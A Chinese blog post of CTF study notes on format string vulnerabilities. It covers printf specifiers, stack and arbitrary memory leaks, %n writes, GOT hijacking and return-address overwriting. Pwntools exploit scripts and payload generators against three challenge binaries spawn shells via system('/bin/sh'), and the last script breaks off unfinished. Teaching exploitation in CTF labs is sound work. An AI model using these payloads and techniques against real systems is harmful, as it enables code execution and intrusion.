---
layout:     post
title:  pwn_formatstring
subtitle:   pwn
date:       2019-02-13
author:     DC
header-img: img/post-bg-universe.jpg
catalog: true
tags:

    - PWN

---



# 格式化字符串漏洞

学习笔记，[原文链接](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/)

## 原理

进行格式化字符串漏洞学习其利用时主要分为三个基础知识点：格式化字符串函数、格式化字符串、后续参数。

**格式化字符串函数：**

```shell
输入：
scanf
输出：
printf	输出到 stdout
fprintf	输出到指定 FILE 流
vprintf	根据参数列表格式化输出到 stdout
vfprintf	根据参数列表格式化输出到指定 FILE 流
sprintf	输出到字符串
snprintf	输出指定字节数到字符串
vsprintf	根据参数列表格式化输出到字符串
vsnprintf	根据参数列表格式化输出指定字节到字符串
setproctitle	设置 argv
syslog	输出日志
err, verr, warn, vwarn 等	。。。
```

**格式化字符串 [wiki](https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2):**

```
格式如下： %[parameter][flags][field width][.precision][length]type    例子：%s  %c  %n$x
```

每个参数位常用的用法 和解释

- parameter
  - n$，获取格式化字符串中的指定参数
- flag
- field width
  - 输出的最小宽度
- precision
  - 输出的最大长度
- length，输出的长度
  - hh，输出一个字节
  - h，输出一个双字节
- type
  - d/i，有符号整数
  - u，无符号整数
  - x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  - o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  - s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
  - c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。
  - p， void * 型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", &a) 打印变量 a 所在的地址。
  - n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
  - %， '`%`'字面值，不接受任何 flags, width。

**后续参数**：占位符所对应后面的参数

**漏洞成因：**

在格式化函数中，**被解析的参数的个数也自然是由这个格式化字符串所控制**，当并没有提供参数或者其他相关问题时，会造成格式化字符串对对应内存进行解析。

```
printf("Color %s, Number %d, Float %4.2f");
```

1. 解析其地址对应的字符串
2. 解析其内容对应的整形值
3. 解析其内容对应的浮点值

从而导致可能被利用。



## 测试方法

**常见测试利用手段方法：**

- 使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大。   %s%s%s%s%s%s%s%s%s%s%s%s
- 查看进程内容，根据 %d，%f 输出了栈上的内容。

通过 %d %f 等可以用来做内存泄漏，从而根据内存数据来泄漏信息

**泄漏栈内存：**

1.获取某个变量值或字符串：（1） %x  %p  %n$x(**直接接获取栈中第 n+1 个参数的值**，%s等都可以，但是视内存限制所定)

**泄漏任意地址内存**

用来格式化字符串的地址 一般都存在在栈上第一个参数变量位， 该格式化字符串 的K位参数 为对应调用参数时，我们可以通过   **addr%k$s** 就可以确定addr 地址的内容

确定格式化字符串为第几个参数

[tag]%p%p%p%p%p%p%p%p  某个%p 会和tag 一样  则采取这种方法获取

**使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，需要做字节填充**

```
[padding][addr]  
```

```python
# 获取got表scanf 地址
from pwn import *
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print hex(__isoc99_scanf_got)
payload = p32(__isoc99_scanf_got) + '%4$s'
print payload
gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got
sh.interactive()
```

**覆盖内存**

```
%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量
```

```
...[overwrite addr]....%[overwrite offset]$n
overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。
```

步骤：

- 确定覆盖地址
- 确定相对偏移
- 进行覆盖

```
假设需要在指定地址写入16
[addr of c]%012d%6$n
address 4 +  %012d 为12个字符  这样 $n写入的字符就是16个  
```



**覆盖任意地址内存**

**覆盖小数字**

因为[addr of c]%012d%6$n  中  [addr of c]  字长为4  所以 想覆盖成小数就需要使用

采用 参数 后置 的方法

aa%8$naa +addr 

aa%8    $naa    4位

首先偏移就改变为  8 印后参数后置了

然后利用截断  值  提取 aa 的长度  则 为2 

```
def fora():
    sh = process('./overwrite')
    a_addr = 0x0804A024
    payload = 'aa%8$naa' + p32(a_addr)
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()
```

**覆盖大数字**

```
hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。
h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。
```

利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节

如果我们要覆盖 一个 12354678 这么大的数

则需要进行  如下格式的覆盖

```
0x0804A028 \x78
0x0804A029 \x56
0x0804A02a \x34
0x0804A02b \x12
```

```
p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n'

实例：
(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn
```

**4 * 4 地址加 pad长度 来 覆盖数字**

脚本：

```
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload
payload = fmt_str(6,4,0x0804A028,0x12345678)
```

其中每个参数的含义基本如下

- offset 表示要覆盖的地址最初的偏移
- size 表示机器字长
- addr 表示将要覆盖的地址。
- target 表示我们要覆盖为的目的变量值。

相应的 exploit 如下

```
def forb():
    sh = process('./overwrite')
    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)
    print payload
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()
```





### 例题实例分析



**64位程序格式化字符串漏洞**

原理

其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。

**前6个参数为寄存器 edi、esi、edx、ecx、r8d、r9d**



题目： [pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+3h] [rbp-3Dh]
  signed int i; // [rsp+4h] [rbp-3Ch]
  signed int j; // [rsp+4h] [rbp-3Ch]
  char *format; // [rsp+8h] [rbp-38h]
  _IO_FILE *fp; // [rsp+10h] [rbp-30h]
  char *v9; // [rsp+18h] [rbp-28h]
  char v10[24]; // [rsp+20h] [rbp-20h]
  unsigned __int64 v11; // [rsp+38h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  fp = fopen("flag.txt", "r");
  for ( i = 0; i <= 21; ++i )
    v10[i] = _IO_getc(fp);
  fclose(fp);
  v9 = v10;
  puts("what's the flag");
  fflush(_bss_start);
  format = 0LL;
  __isoc99_scanf("%ms", &format);
  for ( j = 0; j <= 21; ++j )   #逐个做字符串对比，v10为flag 字符串
  {
    v4 = format[j];
    if ( !v4 || v10[j] != v4 )
    {
      puts("You answered:");
      printf(format);    <=============格式化字符串漏洞利用， 直接泄漏栈内存其实可以看到。
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      return 0;
    }
  }
  printf("That's right, the flag is %s\n", v9);
  fflush(_bss_start);
  return 0;
}
```

检查防护机制开启

```shell
checksec goodluck
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/toor/.pwntools-cache/update to 'never'.
[*] A newer version of pwntools is available on pypi (3.12.1 --> 3.12.2).
    Update with: $ pip install -U pwntools
[*] '/home/toor/Desktop/goodluck'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

首先确定覆盖的偏移是多少

```shell
手工偏移计算，及泄漏栈中数据：
 ./goodluck
what's the flag
AAAAAA%p%p%p%p%p%p%p%p%p%p%p%p
You answered:
AAAAAA0xd5c0100x7fd5f871a7800x7fd5f844b2c00x7fd5f89297000x7fd5f89297010x410000010xd5c8300xd5c0100x7ffcb5fa62100x4141417b67616c660x41414141414141410x414141414141
But that was totally wrong lol get rekt


toor@ubuntu:~/Desktop$ ./goodluck
what's the flag
%11$p
You answered:
0x4141414141414141
But that was totally wrong lol get rekt

即 获取到 第10个参数的值为提取参数
```

调试栈中数据，进行泄漏

```shell
0x00007fffffffde58│+0x0000: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8 ← $rsp
0x00007fffffffde60│+0x0008: 0x0000000025000001
0x00007fffffffde68│+0x0010: 0x0000000000602830  →  0x0000000073243925 ("%9$s"?)
0x00007fffffffde70│+0x0018: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffde78│+0x0020: 0x00007fffffffde80  →  "flag{AAAAAAAAAAAAAAAAA"
0x00007fffffffde80│+0x0028: "flag{AAAAAAAAAAAAAAAAA"
0x00007fffffffde88│+0x0030: "AAAAAAAAAAAAAA"
0x00007fffffffde90│+0x0038: 0x0000414141414141 ("AAAAAA"?)
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
   0x7ffff7a62813 <printf+19>      mov    QWORD PTR [rsp+0x38], rcx
   0x7ffff7a62818 <printf+24>      mov    QWORD PTR [rsp+0x40], r8
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "goodluck", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7a62800 → __printf(format=0x602830 "%9$s")
[#1] 0x400890 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  

AAAAAAAA 是栈中数据

```

https://github.com/scwuaptx/Pwngdb  插件可以直接获取，需py3+版本



```
结果：
toor@ubuntu:~/Desktop$ ./goodluck 
what's the flag
%9$s
You answered:
flag{AAAAAAAAAAAAAAAAA
But that was totally wrong lol get rekt
toor@ubuntu:~/Desktop$ ./goodluck 
what's the flag
flag{AAAAAAAAAAAAAAAAA
That's right, the flag is flag{AAAAAAAAAAAAAAAAA

```



**劫持 got表**



在没有开启 RELRO 保护的前提下，修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。



假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤

- 确定函数 A 的 GOT 表地址。

  - 这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。

- 确定函数 B 的内存地址

  - 这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。

- 将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。

  - 这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种

    - 写入函数：write 函数。
    - ROP

    ```
    pop eax; ret;           # printf@got -> eax
    pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -> ebx
    add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
    ```

    - 格式化字符串任意地址写



题目 [**2016-CCTF-pwn3**](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3)

```
1.程序保护校验
checksec pwn3
[*] '/home/toor/Desktop/pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    
开启了 NX
```

看一下这个程序：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // eax
  int v4; // [esp+14h] [ebp-2Ch]
  int v5; // [esp+3Ch] [ebp-4h]

  setbuf(stdout, 0);
  ask_username((char *)&v4);  //账号   
  ask_password((char *)&v4);  //密码验证
  while ( 1 )
  {
    while ( 1 )
    {
      print_prompt();
      v3 = get_command();    //三个选择   get  put  dir
      v5 = v3;
      if ( v3 != 2 )         //put模式     实现了 大概的 漏洞功能
        break;
      put_file();            
    }
    if ( v3 == 3 )          //dir 模式     实现了大概的 目录遍历功能 
    {
      show_dir();
    }
    else
    {
      if ( v3 != 1 )        //get模式    
        exit(1);
      get_file();             // 这里 给出了明显的提示
    }
  }
}



int get_file()
{
  char dest; // [esp+1Ch] [ebp-FCh]
  char s1; // [esp+E4h] [ebp-34h]
  char *i; // [esp+10Ch] [ebp-Ch]

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )     //  文件名为 flag
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )  //从put里的数据中拿,借助文件来进行参数传递
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);       //这个地方可以执行  格式化漏洞调试
      return printf(&dest);          
    }
  }
  return printf(&dest);              
}


int show_dir()
{
  int v0; // eax
  char s[1024]; // [esp+14h] [ebp-414h]
  int i; // [esp+414h] [ebp-14h]
  int j; // [esp+418h] [ebp-10h]
  int v5; // [esp+41Ch] [ebp-Ch]

  v5 = 0;
  j = 0;
  bzero(s, 0x400u);
  for ( i = file_head; i; i = *(_DWORD *)(i + 240) )
  {
    for ( j = 0; *(_BYTE *)(i + j); ++j )
    {
      v0 = v5++;
      s[v0] = *(_BYTE *)(i + j);
    }
  }
  return puts(s);       《=======  这个 地方的 put  可以在 当被替换的对象，同时会读取文件中得数据可以当做参数
}
```



密码绕过

```c
char *__cdecl ask_username(char *dest)
{
  char src[40]; // [esp+14h] [ebp-34h]
  int i; // [esp+3Ch] [ebp-Ch]

  puts("Connected to ftp.hacker.server");
  puts("220 Serv-U FTP Server v6.4 for WinSock ready...");
  printf("Name (ftp.hacker.server:Rainism):");
  __isoc99_scanf("%40s", src);
  for ( i = 0; i <= 39 && src[i]; ++i )
    ++src[i];    //输入的字符都会加1
  return strcpy(dest, src);
}

int __cdecl ask_password(char *s1)
{
  if ( strcmp(s1, "sysbdmin") )    //输入的用户名 自加1 后 等于sysbdmin就可以了  rxraclhm
  {
    puts("who you are?");          
    exit(1);
  }
  return puts("welcome!");
}
```





**确定格式化字符串参数偏移**

进行确定的偏移就要进入到  溢出点位置进行测试。通过 put 文件进行参数传递

```shell
Starting program: /home/toor/Desktop/pwn3 
Connected to ftp.hacker.server
220 Serv-U FTP Server v6.4 for WinSock ready...
Name (ftp.hacker.server:Rainism):rxraclhm
welcome!
ftp>put
please enter the name of the file you want to upload:1111
then, enter the content:AAAA%p%p%p%p%p%p%p%p%p%p
ftp>get
enter the file name you want to get:1111
AAAA0x804b4380x40x804833e0xf7e721e7(nil)0xf7fb85a00x414141410x702570250x702570250x70257025ftp>



Starting program: /home/toor/Desktop/pwn3 
Connected to ftp.hacker.server
220 Serv-U FTP Server v6.4 for WinSock ready...
Name (ftp.hacker.server:Rainism):rxraclhm
welcome!
ftp>put
please enter the name of the file you want to upload:2222
then, enter the content:AAAA%7$x     <===   偏移为7
ftp>get
enter the file name you want to get:2222
AAAA41414141ftp>
```

- 利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。
- 修改 puts@got 的内容为 system 的地址。

采用pwntools 的

```
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got)) 这个地方写 8是因为 写入得数据为  AAAA（7）gotaddr(8)
puts_addr = u32(get('1111')[:4])  在内存中获取puts地址

libc = LibcSearcher("puts", puts_addr)   通过内存偏移 来计算  文件偏移
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset   计算出 system偏移
```



```
PWNtools 特有的函数
fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址
```

- 当程序再次执行 puts 函数的时候，其实执行的是 system 函数。

通过再次执行listdir 就可以执行被覆盖的system 函数  传参 /bin/sh 直接执行命令。



则与程序交互的步骤就是 

1. 通过 put  get   获取 got表地址
2. 通过根据libc计算system偏移
3. 通过 put get 进行覆盖 system
4. 执行 put  传递参数 %s 进去  执行  listdir



exp:

```python
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')


def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)


def show_dir():
    sh.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)


##password
password()
## get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

## get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;')

## system('/bin/sh')
show_dir()
sh.interactive()
```



**劫持 返回地址**

利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址



例题  [三个白帽 - pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0)

```
checksec pwnme_k0 
[*] '/home/toor/Desktop/pwnme_k0'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
NX relro 开启
```



对程序进程分析，可以看出是，输入账号密码，查看 账号密码  或者修改账号密码  或者退出的功能

在格式化漏洞利用里，got表劫持，劫持对象不够明确，因为只用printf的影响调用，所以题目考虑采用劫持返回地址值。



对pwn文件进行分析比较典型的几个地方

```
存在/bin/sh 直接调用
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA                 mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text:00000000004008B7                 retn
```

```c
//主函数
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // r8
  __int64 v6; // r9
  FILE *v7; // rdi
  __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // r8
  __int64 v11; // r9
  __int64 buf; // [rsp+10h] [rbp-60h]
  __int64 v14; // [rsp+18h] [rbp-58h]
  __int64 v15; // [rsp+20h] [rbp-50h]
  __int64 v16; // [rsp+28h] [rbp-48h]
  __int64 v17; // [rsp+30h] [rbp-40h]
  __int64 v18; // [rsp+40h] [rbp-30h]
  __int64 v19; // [rsp+48h] [rbp-28h]
  char v20[20]; // [rsp+50h] [rbp-20h]
  int v21; // [rsp+64h] [rbp-Ch]

  v18 = 48LL;
  v19 = 0LL;
  *(_DWORD *)v20 = 0;
  *(_QWORD *)&v20[4] = 0x30LL;
  *(_QWORD *)&v20[12] = 0LL;
  v21 = 0;
  sub_4008BB();
  while ( 1 )
  {
    sub_400903(      //注册账号地址
      (__int64)&buf,
      (__int64)a2,
      v3,
      v4,
      v5,
      v6,
      v18,
      v19,
      *(__int64 *)v20,
      *(__int64 *)&v20[8],
      *(__int64 *)&v20[16]);
    if ( (_BYTE)buf != 48 )
      break;
    puts("Register failure,try again...");
    fflush(stdout);
  }
  puts("Register Success!!");
  v7 = stdout;
  fflush(stdout);
  sub_400D2B((__int64)v7, (__int64)a2, v8, v9, v10, v11, buf, v14, v15, v16, v17); 
  //循环选项，显示注册信息，更改注册信息，退出三个选项
  return 0LL;
}
```

```c
//注册函数

__int64 __fastcall sub_400903(__int64 buf, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 bufa, __int64 a8, __int64 a9, __int64 a10, __int64 a11)
{
  unsigned __int8 v12; // [rsp+1Fh] [rbp-1h]

  puts("Register Account first!");
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v12 = read(0, &bufa, 0x14uLL);    //注册名
  if ( v12 && v12 <= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    read(0, (char *)&a9 + 4, 20uLL);     //注册密码
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a8;
    *(_QWORD *)(buf + 16) = a9;
    *(_QWORD *)(buf + 24) = a10;
    *(_QWORD *)(buf + 32) = a11;
  }
  else
  {
    LOBYTE(bufa) = 48;
    puts("error lenth(username)!try again");
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a8;
    *(_QWORD *)(buf + 16) = a9;
    *(_QWORD *)(buf + 24) = a10;
    *(_QWORD *)(buf + 32) = a11;
  }
  return buf;
}
```

```c
//选择函数
int __fastcall sub_400D2B(__int64 s, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 sa, __int64 a8, __int64 a9, __int64 a10, __int64 a11)
{
  char v11; // di
  int v12; // eax
  __int64 v13; // rdx
  __int64 v14; // rcx
  __int64 v15; // r8
  __int64 v16; // r9

  v11 = (char)stdin;
  setbuf(stdin, 0LL);
  while ( 1 )
  {
    v12 = sub_400A75();
    switch ( v12 )
    {
      case 2:
        sub_400B41((__int64)&sa, 0LL, v13, v14, v15, v16, sa, a8, a9, a10, a11);//修改
        break;
      case 3:
        return sub_400D1A();//退出
      case 1:
        sub_400B07(v11, 0LL, v13, v14, v15, v16, sa, a8, a9);//显示
        break;
      default:
        puts("error options");
        fflush(stdout);
        break;
    }
    v11 = (char)stdout;
    fflush(stdout);
  }
}
//显示信息函数
int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf((const char *)&a9 + 4);   //明显的字符串调用讨论，参数和password名称一致
}
```



```shell
//尝试针对密码这边进程格式话字符串利用
toor@ubuntu:~/Desktop$ ./pwnme_k0 
**********************************************
*                                            *
*Welcome to sangebaimao,Pwnn me and have fun!*
*                                            *
**********************************************
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
Welc0me to sangebaimao!
aaaaaaaa
0xa150100x7fee0ef9b7800x90x7fee0f1aa7000x90x7ffcd663d0300x400d740x61616161616161@1.Sh0w Account Infomation!           aaaa 在第8位
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>

可以看到  aaaaa 的 用户名 在泄露栈  的 格式化字符串的偏移第8位
且，打印时大打的是名字。

```

利用格式化漏洞字符串进行返回地址覆盖，进行利用的方法。

- 确定偏移
- 获取函数的 rbp 与返回地址
- 根据相对偏移获取存储返回地址的地址
- 将执行 system 函数调用的地址写入到存储返回地址的地址。

**确定偏移**

为8

**返回地址查找：可以根据栈的当前数据状态（获取函数的 rbp 与返回地址）**

看出，0x00007fffffffddf0 为当前函数  rbp    0x0000000000400d74 为本函数返回值

```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffddb0│+0x0000: 0x00007fffffffddf0  →  0x00007fffffffdea0  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp  《========rsp rbp当前位置
0x00007fffffffddb8│+0x0008: 0x0000000000400d74  →   add rsp, 0x30《--------为本函数返回地址
0x00007fffffffddc0│+0x0010: "AAAAAAAA"
0x00007fffffffddc8│+0x0018: 0x000000000000000a
0x00007fffffffddd0│+0x0020: 0x7025702500000000
0x00007fffffffddd8│+0x0028: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdde0│+0x0030: "%p%p%p%pM\r@"
0x00007fffffffdde8│+0x0038: 0x0000000000400d4d  →   cmp eax, 0x2


text:0000000000400D6C                 push    [rbp+s]
.text:0000000000400D6F                 call    sub_400B07     《--- 调用函数
.text:0000000000400D74                 add     rsp, 30h        《====返回地址
.text:0000000000400D78                 jmp     short loc_400DC2     
```

0x00007fffffffddf0（r'b'p）  -   0x00007fffffffddb8(返回地址) = 0x38

获取

**根据相对偏移获取存储返回地址的地址**

则 只要获得在编写payload时   rbp -0x38 = 返回地址

修改0x400d74 为 /bin/sh 的地址  0x400d8AA 可直接修改前 8AA



故exp  编写逻辑

- 写入名字获取rbp，通过计算，获取返回地址长度

- 重新更改名字，改返回值为/bin/sh处地址



```shell
'/home/toor/Desktop/pwnme_k0'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[DEBUG] Received 0x127 bytes:
    '**********************************************\n'
    '*                                            *\n'
    '*Welcome to sangebaimao,Pwnn me and have fun!*\n'
    '*                                            *\n'
    '**********************************************\n'
    'Register Account first!\n'
    'Input your username(max lenth:20): \n'
[DEBUG] Sent 0x9 bytes:
    '11111111\n'
[DEBUG] Received 0x24 bytes:
    'Input your password(max lenth:20): \n'
[DEBUG] Sent 0x5 bytes:
    '%6$p\n'
[DEBUG] Received 0x5f bytes:
    'Register Success!!\n'
    '1.Sh0w Account Infomation!\n'
    '2.Ed1t Account Inf0mation!\n'
    '3.QUit sangebaimao:(\n'
    '>'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x64 bytes:
    '11111111\n'
    '0x7fff94bd6350\n'
    '1.Sh0w Account Infomation!\n'
    '2.Ed1t Account Inf0mation!\n'
    '3.QUit sangebaimao:(\n'
    '>'
[+] ret_addr:0x7fff94bd6318
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x2a bytes:
    'please input new username(max lenth:20): \n'
[DEBUG] Sent 0x9 bytes:
    00000000  18 63 bd 94  ff 7f 00 00  0a                        │·c··│····│·│
    00000009
[DEBUG] Received 0x2a bytes:
    'please input new password(max lenth:20): \n'
[DEBUG] Sent 0xc bytes:
    '%2218d%8$hn\n'
[DEBUG] Received 0x4c bytes:
    '1.Sh0w Account Infomation!\n'
    '2.Ed1t Account Inf0mation!\n'
    '3.QUit sangebaimao:(\n'
    '>'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x8b1 bytes:
    00000000  18 63 bd 94  ff 7f 20 20  20 20 20 20  20 20 20 20  │·c··│··  │    │    │
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000008a0  20 20 20 20  20 2d 31 37  39 39 35 32  37 36 34 32  │    │ -17│9952│7642│
    000008b0  0a                                                  │·│
    000008b1
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x128 bytes:

```



POC:

```python
from pwn import *
context.log_level="debug"
context.arch="amd64"

sh=process("./pwnme_k0")
binary=ELF("pwnme_k0")
#gdb.attach(sh)

sh.recv()
sh.writeline("1"*8)
sh.recv()
sh.writeline("%6$p")
sh.recv()
sh.writeline("1")
sh.recvuntil("0x")
ret_addr = int(sh.recvline().strip(),16) - 0x38
success("ret_addr:"+hex(ret_addr))


sh.recv()
sh.writeline("2")
sh.recv()
sh.sendline(p64(ret_addr))
sh.recv()
#sh.writeline("%2214d%8$hn")
